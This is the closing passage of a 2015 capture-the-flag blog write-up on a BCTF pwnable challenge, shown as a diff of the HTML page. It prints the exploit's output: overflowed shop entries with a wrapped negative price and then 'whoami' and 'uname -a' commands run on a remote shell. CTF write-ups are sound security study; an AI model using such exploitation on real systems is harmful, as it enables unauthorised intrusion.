+</span><span class='line'>15<span class="o">)</span> Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+</span><span class='line'>16<span class="o">)</span> Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBd�
+</span><span class='line'>Your total money: <span class="m">100000</span> CNY.
+</span><span class='line'>What <span class="k">do</span> you want to buy?
+</span><span class='line'> whoami
+</span><span class='line'>bas
+</span><span class='line'>uname -a
+</span><span class='line'>Linux tritonal 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.65-1+deb7u2 x86_64 GNU/Linux</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Unfortunately, a day too late for the CTF.</p>
+
+<h2>Conclusion</h2>
+
+<p>I had found nearly all the puzzle pieces, yet missed the final small piece. For the next CTF, I will Try Harder!</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-03-23T18:55:51+01:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2015</span></span> <span class='time'>6:55 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/pwnable/'>pwnable</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/03/18/bsides-vancouver-ctf-www/" title="Previous Post: BSides Vancouver CTF - WWW">&laquo; BSides Vancouver CTF - WWW</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/">After the Fact - BCTF Zhong Guan Cun Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/18/bsides-vancouver-ctf-www/">BSides Vancouver CTF - WWW</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/18/bsides-vancouver-ctf-sushi/">BSides Vancouver CTF - Sushi</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/">Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">Solving the X86-64 Shellcoding Challenges of RingZer0CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/';
+        var disqus_url = 'http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
